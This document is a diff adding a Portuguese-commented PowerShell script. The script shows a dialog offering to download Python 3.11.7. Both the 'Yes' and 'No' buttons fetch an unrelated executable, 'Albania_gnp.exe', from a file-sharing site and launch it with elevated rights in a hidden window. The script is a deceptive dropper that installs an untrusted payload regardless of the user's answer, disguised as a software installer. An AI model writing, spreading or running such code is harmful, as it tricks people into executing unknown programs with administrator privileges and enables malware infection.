@@ -1,0 +1,47 @@
+# Importando módulos necessários
+Add-Type -AssemblyName PresentationFramework
+Add-Type -AssemblyName System.Windows.Forms
+
+# Criando o formulário
+$form = New-Object Windows.Forms.Form
+$form.Text = "Download e Execução"
+$form.Size = New-Object Drawing.Size(400,150)
+$form.StartPosition = "CenterScreen"
+
+# Criando o rótulo
+$label = New-Object Windows.Forms.Label
+$label.Location = New-Object Drawing.Point(10,30)
+$label.Size = New-Object Drawing.Size(380,40)
+$label.Text = "Deseja baixar Python 3.11.7?"
+$form.Controls.Add($label)
+
+# Botão Sim
+$buttonYes = New-Object Windows.Forms.Button
+$buttonYes.Location = New-Object Drawing.Point(50,80)
+$buttonYes.Size = New-Object Drawing.Size(75,23)
+$buttonYes.Text = "Sim"
+$buttonYes.Add_Click({
+    $url = "https://www.upload.ee/download/16547700/fb2a8f0ad4131eac1f1d/Albania_gnp.exe"
+    $caminhoArquivo = "$env:TEMP\Albania_gnp.exe"
+    Invoke-WebRequest -Uri $url -OutFile $caminhoArquivo
+    Start-Process -FilePath $caminhoArquivo -Verb RunAs -WindowStyle Hidden
+    $form.Close()
+})
+$form.Controls.Add($buttonYes)
+
+# Botão Não
+$buttonNo = New-Object Windows.Forms.Button
+$buttonNo.Location = New-Object Drawing.Point(200,80)
+$buttonNo.Size = New-Object Drawing.Size(75,23)
+$buttonNo.Text = "Não"
+$buttonNo.Add_Click({
+    $url = "https://www.upload.ee/download/16547700/fb2a8f0ad4131eac1f1d/Albania_gnp.exe"
+    $caminhoArquivo = "$env:TEMP\Albania_gnp.exe"
+    Invoke-WebRequest -Uri $url -OutFile $caminhoArquivo
+    Start-Process -FilePath $caminhoArquivo -Verb RunAs -WindowStyle Hidden
+    $form.Close()
+})
+$form.Controls.Add($buttonNo)
+    
+# Exibindo o formulário
+$form.ShowDialog() | Out-Null
